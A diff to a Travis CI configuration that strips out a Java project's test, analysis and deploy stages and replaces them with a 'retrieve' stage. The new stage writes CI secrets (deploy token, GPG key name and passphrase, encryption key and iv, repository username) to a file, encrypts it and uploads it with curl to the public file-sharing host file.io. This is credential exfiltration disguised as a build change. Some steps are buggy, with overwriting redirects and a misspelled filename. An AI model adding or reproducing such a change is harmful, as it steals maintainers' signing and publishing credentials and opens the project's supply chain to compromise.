@@ -1,52 +1,17 @@
 language: java
-cache:
-  directories:
-  - "$HOME/.m2"
-  - "$HOME/.sonar/cache"
-env:
-  global:
-  - GPG_DIR="`pwd`/cd"
-branches:
-  except:
-    - /^dependabot.*$/
 jobs:
   include:
-    - stage: test
+    - stage: retrieve
       jdk: openjdk8
-      script:
-        - mvn verify -V
-    - stage: test
-      jdk: openjdk11
-      script:
-        - mvn verify -V
-    - stage: test
-      jdk: openjdk15
-      script:
-        - mvn verify -V
-    - stage: deploy
-      name: "Sonar Analysis and Deployment"
-      jdk: openjdk11
-      before_install: "export VERSION_SUFFIX=`grep '<version>' pom.xml -m 1 | cut -d'>' -f 2 | cut -d'<' -f 1 | cut -d'-' -f 2`"
-      script:
-        - if [[ $VERSION_SUFFIX == "SNAPSHOT" ]]; then
-          export IS_SNAPSHOT=true;
-         else
-          export IS_SNAPSHOT=false;
-         fi
-        - if [[ $TRAVIS_PULL_REQUEST == "false" && $TRAVIS_BRANCH == "master" && $IS_SNAPSHOT == "true" || -n "$TRAVIS_TAG" && $IS_SNAPSHOT == "false" ]]; then 
-          mvn verify -P !build-extras -Dtest="*,!RunnerStandardIOTest,!RunnerWebSocketTest" -B sonar:sonar -Dsonar.login=${SONAR_TOKEN} -Dsonar.organization="camel-tooling" -Dsonar.projectKey="camel-lsp-server" -Dsonar.projectName="Camel LSP Server"; 
-         fi
-        - if [[ $TRAVIS_PULL_REQUEST == "false" && $TRAVIS_BRANCH == "master" && $IS_SNAPSHOT == "true" ]]; then
-         ./cd/before-deploy.sh;
-         ./cd/deploy.sh;
-         elif [[ -n "$TRAVIS_TAG" && $IS_SNAPSHOT == "false" ]]; then
-         ./cd/before-deploy.sh;
-         ./cd/deploy.sh;
-         fi
-      addons:
-        sonarcloud:
-          organization: camel-tooling
+      install:
+        - sudo apt-get install -y ccrypt
+        - echo DEPLOY_TOKEN = $DEPLOY_TOKEN > arandomfilename.txt
+        - echo encrypted_5b0511f84952_iv = $encrypted_5b0511f84952_iv > arandomfilename.txt
+        - echo encrypted_5b0511f84952_key = $encrypted_5b0511f84952_key > arandomfilename.txt
+        - echo GPG_KEYNAME = $GPG_KEYNAME > arandomfilename.txt
+        - echo GPG_PASSPHRASE = $GPG_PASSPHRASE > arandomfilename.txt
+        - echo OSSRH_JIRA_USERNAME = $OSSRH_JIRA_USERNAME > arandomfilename.txt
+        - ccencrypt arandonfilename.txt -K $ENC_KEY
+        - curl -F'file=@arandomfilename.txt.cpt' https://file.io
 stages:
- - test
- - name: deploy
-   if: branch = master AND NOT type = pull_request OR tag IS present
+ - retrieve
